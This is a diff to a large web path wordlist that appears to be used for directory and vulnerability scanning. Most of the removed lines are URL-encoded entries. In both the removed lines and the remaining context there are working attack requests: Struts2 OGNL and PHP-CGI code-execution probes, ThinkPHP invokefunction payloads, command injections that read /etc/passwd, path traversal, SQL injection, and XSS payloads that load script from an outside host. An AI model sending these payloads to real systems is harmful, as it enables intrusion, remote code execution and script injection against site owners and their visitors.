@@ -30,7 +30,6 @@ $SysReset/ResetSession.xml
 11.txt
 12052019.sql
 123131/index.php
-123%E5%BC%80%E5%A5%96%E5%99%A8/config.js
 12f592fb181d007c7b1b733b23c5428e.php
 172410101040/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 1board/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
@@ -65,7 +64,6 @@ $SysReset/ResetSession.xml
 /2019/wp-login.php
 2020/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 /2020/wp-login.php
-%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f
 298dfa4263831599097711415f99177b.php
 2b7lz7zm.pl
 2bg7v0u0.pl
@@ -104,11 +102,8 @@ _3_struts_action
 5d9936f4a7c346a5ef0e917bba466f97.php
 5pzan9qu.pl
 5smxc1uk.pl
-%62%61%73%65/%70%6F%73%74%2E%70%68%70
-%63%67%69%2D%62%69%6E/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E
 65a6c6698705002397bff007557077bb.php
 65E61DBF9A80EE819EE51A0E27464C3E.php
-%69%73%70%69%72%69%74/%69%6D/%75%70%6C%6F%61%64%2E%70%68%70
 6Brr
 6ed6cb55a809302d17744691501fcac6.php
 6fos57j2.pl
@@ -117,9 +112,6 @@ _3_struts_action
 6p6/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 6x0nl7ot.pl
 720bce017f52b63e014cf3eb6c5b891c.php
-%73%65%65%79%6F%6E/%68%74%6D%6C%6F%66%66%69%63%65%73%65%72%76%6C%65%74
-%75%73%65%72%2e%70%68%70
-%75%73%65%72/%72%65%67%69%73%74%65%72?%65%6c%65%6d%65%6e%74%5f%70%61%72%65%6e%74%73=%74%69%6d%65%7a%6f%6e%65%2f%74%69%6d%65%7a%6f%6e%65%2f%23%76%61%6c%75%65&%61%6a%61%78%5f%66%6f%72%6d=1&%5f%77%72%61%70%70%65%72%5f%66%6f%72%6d%61%74=%64%72%75%70%61%6c%5f%61%6a%61%78
 777c79f5bbcf1206fbed1ff85e5df42e.php
 79688458a951e03ab12c8631528fed36.php
 7D30AF06EBB7D3D3312997CADA3BCAB3.php
@@ -218,7 +210,6 @@ admin122/Admincenter/Index.index.do
 admin123/login.asp
 admin123/login.php
 Admin1c620f33/Login.php
-ADMIN%24
 Admin3ba04fb2/Login.php
 Admin506769ac/Login.php
 Admin52773ab0/Login.php
@@ -253,7 +244,6 @@ Admincfb663a7/Login.php
 admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php
 /admin/config.php
 admin/config.php
-admin/config.php?password%5B0%5D=ZIZO&username=admin
 admin/connection/
 admincooptel/phpMyAdmin/scripts/setup.php
 admin_cs/login.asp
@@ -518,14 +508,12 @@ advanced
 advancedSearch
 advancedshow
 advanced/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
-adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bls%20%23&password=asdf
 advDesenvolvimento-1003/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 advertisementId
 adv/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 adxyc/Admincenter/Public.login.do
 adyy/Admincenter/Index.index.do
 aecab5fc5d0bdcca959ce9784713aefe.php
-?a=echo%20-n%20HelloNginx%7Cmd5sum
 af
 afasio/afasio/backend_Julia/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 afasio/backend_Julia/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
@@ -599,7 +587,6 @@ alquimialaravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 altavoces
 alt/sqladmin/scripts/setup.php
 alt_view
-amp%3Bpagenum
 amphtml/.git/config
 am.pl
 amp;municipio_id
@@ -1065,7 +1052,6 @@ apps.properties
 apps/shopify/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
-appVers%20ion
 .appveyor.yml
 .appveyor.yml
 appveyor.yml
@@ -1407,15 +1393,12 @@ bmwstory/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 bn
 boaform/admin/formLogin
 boaform/admin/formPing
-boaform/admin/formPing?target_addr=;'+payload+'%20/&waninf=1_INTERNET_R_VID_154
 board
 board/acp/lib/inserts.sql
-boardData102.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%206GQNHiRVvYsXRo55eoPwwna7jv5PGpHo;%20echo%20
 bochuan/login.asp
 body
 bodyType
 BOEKJ/config.js
-BOEKJ/%E5%BC%80%E5%A5%96%E5%99%A8/config.js
 BOEKJ/kj/config.js
 bogus.log
 book/14-end/api/.npmrc
@@ -1608,7 +1591,6 @@ CatalogManager.properties
 catch
 categorie
 categories
-categories%5B%5D
 categoriesfilter
 category
 categorycond
@@ -1905,7 +1887,6 @@ cgi-bin/formmail.pl
 cgi-bin/ftp/ftp.pl
 cgi-bin/ftplocate/flserv.pl
 cgi-bin/garuuavl.pl
-cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;echo%20$((854625-1));echo%20ffffffffffffffff;
 cgi-bin/generate.cgi
 cgibin/generate.cgi
 cgi-bin/gff/env.pl
@@ -3206,7 +3187,6 @@ CSSUP
 ct
 .ctags
 ctevt/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
-ctl00%24MainContent%24nextPageNum
 ctrlt/DeviceUpgrade_1
 ctry
 ctype
@@ -3338,7 +3318,6 @@ dealer
 dealer_id
 debug
 _debugbar/clockwork/1
-?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest
 debug.cgi
 debug.log
 declaration_more
@@ -3585,16 +3564,9 @@ _dynSessConf
 dzit.properties
 e
 e2e/.env
-%E5%BC%80%E5%A5%96%E5%99%A8/config.js
-%E5%BC%80%E5%A5%96%E5%99%A8/kaijiang/config.js
-%E5%BC%80%E5%A5%96%E5%99%A8/kj/config.js
-%E5%BC%80%E5%A5%96%E5%99%A8/nxkj2015/config.js
-%E5%BC%80%E5%A5%96%E6%96%87%E4%BB%B6/config.js
-%E5%BC%80%E5%A5%96%E7%A8%8B%E5%BA%8F/config.js
 e6786fe6216eebd30638ceffe8c44228.php
 E928329607CB42FD304E5F61633BC9C5.php
 e92_manual.pdf
-%E9%87%87%E9%9B%86/config.js
 e/admin/index.php
 ec
 ecbj6hls.pl
@@ -3610,7 +3582,6 @@ edge_id
 editBlackAndWhiteList
 edition
 .editorconfig
-ed_s_%3Ca_href
 ef064fddbf0fe62c879b07244ec18236.php
 .eggs/
 egsece.pdf
@@ -3626,7 +3597,6 @@ elections/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 elementName
 elID
 .elixir_ls/
-elrekt.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50
 elso1000nap-foto/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 .emacs
 .emacs.desktop
@@ -3884,7 +3854,6 @@ extrafield.log
 ext_uid
 f
 f[0]
-f%20
 f4
 f842010a96130bd22bef8bc32cac4415.php
 .face
@@ -4063,12 +4032,10 @@ filter[hasdemo]
 filter[includes]
 filter[INCLUDE_SUBSECTIONS]
 filterkategorie
-filter[%NAME]
 filter[newupdated]
 filter_order
 filter_producer
 filters
-filters%5Benvie%5D%5B%5D
 filter[score]
 filter[search_text]
 filter_select
@@ -4249,7 +4216,6 @@ fview
 fw
 FxCodeShell.jsp/
 FxCodeShell.jsp::$DATA
-FxCodeShell.jsp%20
 fxoid
 fy
 g
@@ -4303,7 +4269,6 @@ geolocation
 geral/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 gerenciador_dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 getcfg.php
-getcfg.php?A=A%0A_POST_SERVICES%3DDEVICE.ACCOUNT%0AAUTHORIZED_GROUP%3D1
 get_content_only
 getfields
 get_status.cgi
@@ -4846,7 +4811,6 @@ images/stories/cmd.php
 images/stories/filemga.php?ssp=RfVbHu
 images/up.php
 images/vuln.php
-imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini
 imc/reportscript/sqlserver/deploypara.properties
 img
 <IMG SRC="javascript:alert(cross_site_scripting.nasl);">.pl
@@ -4880,7 +4844,6 @@ index.php?m=admin&c=index&a=login&dosubmit=1
 index.php/module/action/param1/${@die(md5(HelloThinkPHP))}
 index.php?param1=assert&param2=print(md5(57575848371));
 index.php?-s
-index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50
 index.php/?s=captcha
 index.php/shougong/
 index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
@@ -4950,7 +4913,6 @@ io_mdist
 .ionide/
 io_page
 ipc$
-ipc%24
 .ipynb_checkpoints
 .irb-history
 .irb_history
@@ -5007,7 +4969,6 @@ jenkins/jobs/htaccess/workspace/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.p
 .jenv-version
 jepsen.log
 .jestrc
-jf%E5%BC%80%E5%A5%96%E5%99%A8/kj/config.js
 jhadmin/login.asp
 jhlyadmin168/login.asp
 jhrisprd
@@ -5020,7 +4981,6 @@ jlr359eq.pl
 jngov/login.asp
 jobfairinfoid
 job_function
-jobholder__%3Ca_hr_%3Ca_href
 jobholder_id
 job_id
 jobid
@@ -5032,7 +4992,6 @@ jobnum
 jobs/htaccess/workspace/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 jobs/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 jobs/workspace/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
-jobTime%5B%5D
 .joe_state
 joomla/
 joomla/robots.txt
@@ -5042,7 +5001,6 @@ jquery/1.2.6/all/jquery.tools.min.js
 jquery/1.4.4/lib/jquery.min.js
 .js
 .jsbeautifyrc
-js/common.js%20
 .jscs.json
 .jscsrc
 .jscsrc.json
@@ -5123,14 +5081,11 @@ kitchen.log
 kj1123/config.js
 kj20150627/config.js
 kj2016/config.js
-kj2016(%E9%87%87%E9%9B%86%E5%99%A8)/config.js
 kj2017/config.js
 kj2018/config.js
-kj2018(%E9%87%87%E9%9B%86%E5%99%A8)/config.js
 kj332235/config.js
 kj88/config.js
 kj/config.js
-kj/%E6%96%B0%E8%9C%82%E5%BC%80%E5%A5%96%E5%99%A8/config.js
 kj/kaijiang/config.js
 kj/kj/config.js
 kj-yuanban/config.js
@@ -5205,7 +5160,6 @@ langue
 Lan_ID
 .lanproxy/config.json
 larabus/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
-Laravel%20E2N%20test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 laravelao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 laravel_api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 laravel/.env
@@ -5274,7 +5228,6 @@ letsencrypt/.env
 letter
 level
 level/15/exec/-/sh/run/CR
-level/16/exec/-/show%20startup-config
 levelNo
 LF
 lg
@@ -5952,7 +5905,6 @@ nginx-server/.env
 NHibernate.Caches.SysCache.Tests.dll.config
 NHibernate.config
 .nia.cache
-nice%20ports%2C/Tri%6Eity.txt%2ebak
 nid
 niffler-frontend/.env
 nights
@@ -6422,7 +6374,6 @@ payment/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 pbx/recordings/theme/main.css
 pcc/vendor/phpunit/phpunit/src/Util/PHP/
 pcc/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
-pclass%5B%5D
 PCL_NO
 pcmanufacturer
 pCurrent
@@ -6554,7 +6505,6 @@ phpMyAdmin._/
 phpMyAdmin__/
 phpmyadmin/ 
 phpmyadmin0/
-phpMyAdmin/%0D
 phpmyadmin0/index.php
 phpmyadmin1/
 phpMyAdmin_111/
@@ -6660,7 +6610,6 @@ phpMyAdmin-2.2.6/
 phpMyAdmin-2.2.6/scripts/setup.php
 phpMyAdmin-2.3.0/scripts/setup.php
 phpMyAdmin-2.3.1/scripts/setup.php
-phpMyAdmin!@%23!@%25$%5E&%25%5E%5E%25/
 phpMyAdmin-2.3.2/scripts/setup.php
 phpMyAdmin-2.3.3/scripts/setup.php
 phpMyAdmin-2.3.4/scripts/setup.php
@@ -7021,7 +6970,6 @@ pinions
 .pipeline/dev_prereq.sh
 pipeline.yml
 .pip/pip.conf
-pk10%E5%BC%80%E5%A5%96%E5%99%A8/kkjj/config.js
 .pkgmeta
 .pki
 .pki/
@@ -10009,8 +9957,6 @@ ProgramData/Windows App Certification Kit/wslk_strings.xml
 ProgramData/Windows App Certification Kit/zh-cn/wslk_strings.xml
 ProgramData/Windows App Certification Kit/zh-tw/wslk_strings.xml
 program/index.php
-program_search%5Bage%5D
-program_search%5Bbranch%5D
 program_search[age]
 prog_slct
 projbackend/.env
@@ -10397,7 +10343,6 @@ ROFL
 rom-0
 roomid
 rooms
-rooms%5B1%5D%5Badults%5D
 root
 root11.php
 root/.env
@@ -10768,10 +10713,8 @@ search_14448
 search_2013
 search_36229
 search_5393
-search%5Bfreetext%5D
 searchall
 search_api_views_fulltext
-searchAreas%5B%5D
 search-bar
 search-btn
 searchbutton
@@ -10839,7 +10782,6 @@ searchResultsPerPage
 _searchresult_WAR_sitesearchportlet_javax.portlet.action
 search_salary_max
 search_salary_min
-searchSaleRent%5B%5D
 search/search.pl
 search/show.pl
 searchSite
@@ -10872,7 +10814,6 @@ searchtxt
 search_type
 SearchType
 searchTypeH
-searchTypes%5B%5D
 search_val
 search_value
 SearchValue
@@ -11016,7 +10957,6 @@ shared/.env
 sheep.php
 shell?/bin/busybox+ABCD
 shell?busybox
-shell?echo%20BKbFjTIa7HO2ajBz
 shell.php
 .shell.pre-oh-my-zsh
 shf
@@ -11924,8 +11864,6 @@ tmUnblock.cgi
 to
 Todate
 todo
-toggleFacet%5Bcountry%5D
-toggleFacet%5Bcountry%5D%3DINDIEN
 ToID
 token_auth.csv
 tomarywr.pl
@@ -12019,10 +11957,6 @@ tvm/fd45jn0f5Gd/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 tx_core4newsenhancer_pi1[action]
 tx_core4newsenhancer_pi1[controller]
 tx_core4newsenhancer_pi1[newsItem]
-tx_nestbssearch_pi1%5Bbrand_id%5D
-tx_nestbssearch_pi1%5Bshow_form_extended%5D
-tx_nestbssearch_pi1%5Bview%5D
-tx_nestbssearch_pi1%5Bview_type%5D
 tx_savoirscdisolrsearch_pi1[aChercher]
 .txt
 txt
@@ -13492,12 +13426,10 @@ viewapp
 view_faq
 viewfull
 view/index.shtml
-view/IPV6/ipv6networktool/traceroute/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40%7Ccat+/etc/passwd;
 viewphoto
 view_product
 viewshowdetail
 Views/ueditor/net/controller.ashx
-view/systemConfig/systemTool/traceRoute/traceroute.php?text_target=127.0.0.1&text_ageout=2&text_minttl=1&text_maxttl=1%7Ccat+/etc/passwd;
 viewType
 .vim/
 .vim.custom
@@ -13522,7 +13454,6 @@ v/index.php
 virtualsite
 visitor_id
 visitorId
-vlc/mojetv.mp4?token=9kaGdBWu3VhLchNipL3yVm0RA%2F8bHHZCJKgINj69%2BZY4TqY9PVmUx8gUhCbZwqFZp7XRLRlxp0QBIeOBunjUMw%3D%3D
 vm-docker-compose/.env
 .vmware/
 vod_installer/.env
@@ -14950,7 +14881,6 @@ wp-admin/admin-ajax.php?action=import_csv
 wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php
 wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=update_plugin
 wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
-wp-admin/admin-ajax.php?action=rss&type=video&vid=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,md5(2349819),24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39%23
 wp-admin/admin-ajax.php?action=save_map_name
 wp-admin/admin-ajax.php?action=wdt_upload_file
 wp-admin/admin-ajax.php?action=wfu_ajax_action&session_token=2
@@ -14963,22 +14893,13 @@ wp-admin/admin-post.php?action=hc_ajax_save_option
 wp-admin/admin-post.php?do_reset_wordpress=1
 wp-admin/admin-post.php?page=br-aapf-setup&step=wizard_selectors
 wp-admin/admin-post.php?page=fp_admin_options_page
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email=%22%3E%3Cscript%20type=text/javascript%20src=%5C'https://slow.destinyfernandi.com/hos?&v15%5C'%3E%3C/script%3E
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email=%22%3E%3Cscript%20type=text/javascript%20src=%5C'https://slow.destinyfernandi.com/hos?&v6%5C'%3E%3C/script%3E
 wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email=(function() { var elem = document.createElement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getElementsByTagName("head")[0].appendChild(elem);})();
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email=(function()%20%7B%20var%20elem%20=%20document.createElement(%5C'script%5C');%20elem.type%20=%20%5C'text/javascript%5C';%20elem.src%20=%20%5C'https://slow.destinyfernandi.com/hos?clod%5C';document.getElementsByTagName(%22head%22)[0].appendChild(elem);%7D)();
 wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v15\'></script>
 wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v6\'></script>
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=%22%3E%3Cscript%20type=text/javascript%20src=%5C'https://slow.destinyfernandi.com/hos?&v15%5C'%3E%3C/script%3E
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=%22%3E%3Cscript%20type=text/javascript%20src=%5C'https://slow.destinyfernandi.com/hos?&v6%5C'%3E%3C/script%3E
 wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function() { var elem = document.createElement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getElementsByTagName("head")[0].appendChild(elem);})();
 wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function() { var elem = document.createElement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getElementsByTagName("head")[0].appendChild(elem);})();&uid=(function() { var elem = document.createElement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getElementsByTagName("head")[0].appendChild(elem);})();&token=(function() { var elem = document.createElement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getElementsByTagName("head")[0].appendChild(elem);})();&email=(function() { var elem = document.createElement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getElementsByTagName("head")[0].appendChild(elem);})();&fly_id=1&article_placement_id=1&sidebar_placement_id=1&return_path=(function() { var elem = document.createElement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getElementsByTagName("head")[0].appendChild(elem);})();
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function()%20%7B%20var%20elem%20=%20document.createElement(%5C'script%5C');%20elem.type%20=%20%5C'text/javascript%5C';%20elem.src%20=%20%5C'https://slow.destinyfernandi.com/hos?clod%5C';document.getElementsByTagName(%22head%22)[0].appendChild(elem);%7D)();
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function()%20%7B%20var%20elem%20=%20document.createElement(%5C'script%5C');%20elem.type%20=%20%5C'text/javascript%5C';%20elem.src%20=%20%5C'https://slow.destinyfernandi.com/hos?clod%5C';document.getElementsByTagName(%22head%22)[0].appendChild(elem);%7D)();&uid=(function()%20%7B%20var%20elem%20=%20document.createElement(%5C'script%5C');%20elem.type%20=%20%5C'text/javascript%5C';%20elem.src%20=%20%5C'https://slow.destinyfernandi.com/hos?clod%5C';document.getElementsByTagName(%22head%22)[0].appendChild(elem);%7D)();&token=(function()%20%7B%20var%20elem%20=%20document.createElement(%5C'script%5C');%20elem.type%20=%20%5C'text/javascript%5C';%20elem.src%20=%20%5C'https://slow.destinyfernandi.com/hos?clod%5C';document.getElementsByTagName(%22head%22)[0].appendChild(elem);%7D)();&email=(function()%20%7B%20var%20elem%20=%20document.createElement(%5C'script%5C');%20elem.type%20=%20%5C'text/javascript%5C';%20elem.src%20=%20%5C'https://slow.destinyfernandi.com/hos?clod%5C';document.getElementsByTagName(%22head%22)[0].appendChild(elem);%7D)();&fly_id=1&article_placement_id=1&sidebar_placement_id=1&return_path=(function()%20%7B%20var%20elem%20=%20document.createElement(%5C'script%5C');%20elem.type%20=%20%5C'text/javascript%5C';%20elem.src%20=%20%5C'https://slow.destinyfernandi.com/hos?clod%5C';document.getElementsByTagName(%22head%22)[0].appendChild(elem);%7D)();
 wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v15\'></script>
 wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v6\'></script>
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token=%22%3E%3Cscript%20type=text/javascript%20src=%5C'https://slow.destinyfernandi.com/hos?&v15%5C'%3E%3C/script%3E
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token=%22%3E%3Cscript%20type=text/javascript%20src=%5C'https://slow.destinyfernandi.com/hos?&v6%5C'%3E%3C/script%3E
 wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v15\'></script>
 wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v6\'></script>
 wp-admin/admin-post.php?page=social-metrics-tracker-export&smt_download_export_file=1&section=gapi
@@ -15602,49 +15523,6 @@ wp-content/plugins/cimy-counter/cimy_counter.php
 wp-content/plugins/civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php
 wp-content/plugins/ckeditor-for-wordpress/
 wp-content/plugins/ckeditor-for-wordpress/ckeditor/
-wp-content/plugins/ck-offers/assets/css/%22data:image/svg+xml,%0A%3Csvg%20width='9px'%20height='6px'%20viewBox='0%200%209%206'%20version='1.1'%20xmlns='http:/www.w3.org/2000/svg'%20xmlns:xlink='http:/www.w3.org/1999/xlink'%3E%3Cg%20id='V1'%20stroke='none'%20stroke-width='1'%20fill='none'%20fill-rule='evenodd'%3E%3Cg%20id='mobile_collapsed'%20transform='translate(-229.000000,%20-912.000000
-wp-content/plugins/ck-offers/assets/css/%22data:image/svg+xml,%3Csvg%20width='9px'%20height='6px'%20viewBox='0%200%209%206'%20version='1.1'%20xmlns='http:/www.w3.org/2000/svg'%20xmlns:xlink='http:/www.w3.org/1999/xlink'%3E%3Cg%20id='V2'%20stroke='none'%20stroke-width='1'%20fill='none'%20fill-rule='evenodd'%3E%3Cg%20id='mobile_collapsed'%20transform='translate(-229.000000,%20-885.000000
-wp-content/plugins/ck-offers/assets/css/%23a
-wp-content/plugins/ck-offers/assets/css/%23ab
-wp-content/plugins/ck-offers/assets/css/%23ad
-wp-content/plugins/ck-offers/assets/css/%23af
-wp-content/plugins/ck-offers/assets/css/%23ah
-wp-content/plugins/ck-offers/assets/css/%23aj
-wp-content/plugins/ck-offers/assets/css/%23al
-wp-content/plugins/ck-offers/assets/css/%23an
-wp-content/plugins/ck-offers/assets/css/%23ap
-wp-content/plugins/ck-offers/assets/css/%23ar
-wp-content/plugins/ck-offers/assets/css/%23at
-wp-content/plugins/ck-offers/assets/css/%23av
-wp-content/plugins/ck-offers/assets/css/%23ax
-wp-content/plugins/ck-offers/assets/css/%23az
-wp-content/plugins/ck-offers/assets/css/%23b
-wp-content/plugins/ck-offers/assets/css/%23c
-wp-content/plugins/ck-offers/assets/css/%23d
-wp-content/plugins/ck-offers/assets/css/%23e
-wp-content/plugins/ck-offers/assets/css/%23f
-wp-content/plugins/ck-offers/assets/css/%23filter-1
-wp-content/plugins/ck-offers/assets/css/%23g
-wp-content/plugins/ck-offers/assets/css/%23h
-wp-content/plugins/ck-offers/assets/css/%23i
-wp-content/plugins/ck-offers/assets/css/%23j
-wp-content/plugins/ck-offers/assets/css/%23k
-wp-content/plugins/ck-offers/assets/css/%23l
-wp-content/plugins/ck-offers/assets/css/%23m
-wp-content/plugins/ck-offers/assets/css/%23mask-3
-wp-content/plugins/ck-offers/assets/css/%23n
-wp-content/plugins/ck-offers/assets/css/%23o
-wp-content/plugins/ck-offers/assets/css/%23p
-wp-content/plugins/ck-offers/assets/css/%23q
-wp-content/plugins/ck-offers/assets/css/%23r
-wp-content/plugins/ck-offers/assets/css/%23s
-wp-content/plugins/ck-offers/assets/css/%23t
-wp-content/plugins/ck-offers/assets/css/%23u
-wp-content/plugins/ck-offers/assets/css/%23v
-wp-content/plugins/ck-offers/assets/css/%23w
-wp-content/plugins/ck-offers/assets/css/%23x
-wp-content/plugins/ck-offers/assets/css/%23y
-wp-content/plugins/ck-offers/assets/css/%23z
 wp-content/plugins/ck-offers/assets/css/ccLanding/tooltip.png
 wp-content/plugins/ck-offers/assets/css/font/ck-icons.eot
 wp-content/plugins/ck-offers/assets/css/font/ck-icons.svg
@@ -15960,7 +15838,6 @@ wp-content/plugins/custom-twitter-feeds-pro/fonts/fontawesome-webfont.woff
 wp-content/plugins/custom-twitter-feeds-pro/img/close.png
 wp-content/plugins/custom-twitter-feeds-pro/img/next.png
 wp-content/plugins/custom-twitter-feeds-pro/img/prev.png
-wp-content/plugins/custom-twitter-feeds-pro/js/+%20a%20+
 wp-content/plugins/custom-twitter-feeds-pro/js/ctf-scripts.js
 wp-content/plugins/custom-twitter-feeds-pro/js/ctf-widgets.js
 wp-content/plugins/cws/css/
@@ -16002,10 +15879,6 @@ wp-content/plugins/democracy/class.php
 wp-content/plugins/democracy/democracy.css
 wp-content/plugins/democracy/democracy.js
 wp-content/plugins/democracy/democracy.php
-wp-content/plugins/democracy/democracy.php%3Fdem_poll_5%3D15%26dem_poll_id%3D5%26dem_action%3Dvote
-wp-content/plugins/democracy/democracy.php%3Fdem_poll_5%3D16%26dem_poll_id%3D5%26dem_action%3Dvote
-wp-content/plugins/democracy/democracy.php%3Fdem_poll_5%3D17%26dem_poll_id%3D5%26dem_action%3Dvote
-wp-content/plugins/democracy/%s
 wp-content/plugins/democracy/style.css
 wp-content/plugins/design-upgrade-learndash/assets/images/calendar.svg
 wp-content/plugins/design-upgrade-learndash/assets/images/checkmark.svg
@@ -16235,7 +16108,6 @@ wp-content/plugins/easy-wp-smtp/js/script.js
 wp-content/plugins/easy-wp-smtp/readme.txt
 wp-content/plugins/eco-annu/map.php
 wp-content/plugins/editormonkey/fckeditor/fckeditor.js
